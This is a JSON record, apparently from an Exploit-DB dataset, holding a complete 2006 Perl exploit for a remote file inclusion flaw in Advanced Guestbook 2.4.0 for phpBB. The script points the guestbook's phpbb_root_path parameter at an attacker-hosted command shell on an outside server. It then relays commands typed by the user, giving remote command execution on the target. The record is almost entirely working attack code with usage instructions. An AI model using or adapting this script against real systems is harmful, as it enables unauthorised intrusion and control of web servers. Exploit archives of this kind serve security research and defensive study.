{
  "id": "1725",
  "title": "Advanced Guestbook 2.4.0 - &#039;phpBB&#039; Remote File Inclusion",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!usr/bin/perl\r\nuse LWP::UserAgent;\r\n# Bug Found by [Oo]\r\n# Exploit coded by n0m3rcy\r\n# Copyright (c) 2006 n0m3rcy@bsdmail.org\r\n# Gr33tz; nukedx , Devil-00 , str0ke , cijfer\r\n# Usage; n0ag.pl <target> <cmd shell location> <cmd shell variable>\r\nif (@ARGV ne 3) { &usage; }\r\nelse { &exploit; }\r\nsub header() {\r\nprint \"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\r\\n\";\r\nprint \"+    Advanced GuestBook for phpBB <= 2.4.0 Remote File Inclusion Exploit      +\\r\\n\";\r\nprint \"+                             Bug found by [Oo]                               +\\r\\n\";\r\nprint \"+                     Copyright (c) 2006 n0m3rcy@bsdmail.org                  +\\r\\n\";\r\nprint \"+                  Gr33tz: nukedx , cijfer , str0ke , Devil-00                +\\r\\n\";\r\nprint \"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\r\\n\";\r\n}\r\nsub usage() {\r\n  &header;\r\n  print \"- Usage: $0 <target> <cmd shell location> <cmd shell variable>\\r\\n\";\r\n  print \"- <target> -> Victim's target ex: www.victim.com/path/\\r\\n\";\r\n  print \"- <cmd shell location> -> www.milw0rm.com/shelltxt\\r\\n\";\r\n  print \"- <cmd shell variable> -> cmd\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit () {\r\nmy $tar = $ARGV[0];\r\nmy $cmdt = $ARGV[1];\r\nmy $cmdv = $ARGV[2];\r\nwhile() {\r\nprint \"[CMD] \\$\";\r\nwhile(<STDIN>) {\r\n$cmd=$_;\r\nchomp($cmd);\r\nmy $exp = LWP::UserAgent->new() or die;\r\nmy $go = HTTP::Request->new(GET =>$tar.' admin/addentry.php?phpbb_root_path='.$cmdt.'?&'.$cmdv.'='.$cmd)or die \"\\r\\n[-] Connected fail\\n\";\r\nmy $rgo = $exp->request($go);\r\nmy $return = $rgo->content;\r\nmy $return =~ tr/[\\n]/[\u00ea]/;\r\nif (!$cmd) { print \"\\nPlease Enter a Command\\n\\n\"; $return =\"\"; }\r\nelsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)\r\n       { print \"\\nCould Not Connect to cmd Host or Invalid Command Variable\\n\";exit }\r\nelsif ($return =~/^<br.\\/>.<b>Fatal.error/) { print \"\\nInvalid Command or No Return\\n\\n\" }\r\nif ($return =~ /(.*)/) {\r\nmy $finreturn = $1;\r\nmy $finreturn=~ tr/[\u00ea]/[\\n]/;\r\nprint \"\\r\\n$finreturn\\n\\r\";\r\nprint \"[+] Exploit successed\\r\\n\";\r\nlast;\r\n}\r\nelse { print \"[CMD] \\$\"; } \r\nlast;\r\n}\r\nexit;\r\n}\r\n}\r\n\r\n# milw0rm.com [2006-04-28]",
  "url": "https://www.exploit-db.com/exploits/1725"
}